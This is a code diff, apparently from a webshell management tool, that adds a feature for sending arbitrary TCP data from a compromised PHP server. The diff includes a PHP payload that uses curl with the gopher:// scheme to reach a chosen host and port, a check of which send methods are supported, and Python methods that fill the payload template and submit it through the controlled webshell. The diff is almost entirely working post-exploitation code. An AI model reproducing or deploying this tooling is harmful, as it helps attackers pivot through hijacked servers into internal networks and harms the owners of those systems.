@@ -240,6 +240,42 @@ if(!is_file(FILEPATH)) {
 """
 )
 
+SEND_BYTES_OVER_TCP_GOPHER_CURL_PHP = compress_phpcode_template(
+    """
+function send_tcp($host, $port, $s)
+{
+    $s = str_replace("+", "%20", urlencode($s));
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "gopher://$host:$port/_$s");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $res = curl_exec($ch);
+    curl_close($ch);
+    return $res;
+}
+                                                                
+if(!function_exists("curl_init")) {
+    decoder_echo("WRONG_NOT_SUPPORTED");
+}else{
+    $result = send_tcp(HOST, PORT, base64_decode(CONTENT_B64));
+    if($result === false) {
+        decoder_echo("WRONG_SEND_FAILED");
+    }else{
+        decoder_echo(base64_encode($result));
+    }
+}
+"""
+)
+
+GET_SEND_TCP_SUPPORT_METHODS = compress_phpcode_template(
+    """
+decoder_echo(json_encode([
+    "gopher_curl" => function_exists("curl_init")
+]));
+"""
+)
+
 GET_BASIC_INFO_PHP = compress_phpcode_template(
     """
 $infos = array();
@@ -488,7 +524,7 @@ basic_info_names = {
 }
 
 
-def base64_encode(s):
+def base64_encode(s: t.Union[str, bytes]):
     """将给定的字符串或字节序列编码成base64"""
     if isinstance(s, str):
         s = s.encode("utf-8")
@@ -801,6 +837,34 @@ class PHPWebshell(PHPSessionInterface):
                 ) from exc
 
         return result
+
+    async def send_bytes_over_tcp(
+        self,
+        host: str,
+        port: int,
+        content: bytes,
+        send_method: t.Union[str, None] = None,
+    ):
+        template = None
+        if send_method == "gopher_curl" or send_method is None:
+            template = SEND_BYTES_OVER_TCP_GOPHER_CURL_PHP
+        else:
+            raise exceptions.UserError(f"找不到TCP发送方法：{send_method}")
+        code = (
+            template.replace("HOST", repr(host))
+            .replace("PORT", str(port))
+            .replace("CONTENT_B64", repr(base64_encode(content)))
+        )
+        result = await self.submit(code)
+        if result == "WRONG_NOT_SUPPORTED":
+            raise exceptions.UserError(f"受控端不支持TCP发送方法：{send_method}")
+        if result == "WRONG_SEND_FAILED":
+            raise exceptions.TargetRuntimeError("受控端发送TCP失败")
+        return base64.b64decode(result)
+
+    async def get_send_tcp_support_methods(self):
+        result = json.loads(await self.submit(GET_SEND_TCP_SUPPORT_METHODS))
+        return [key for key, value in result.items() if value]
 
     async def get_pwd(self) -> str:
         return await self.submit("decoder_echo(__DIR__);")
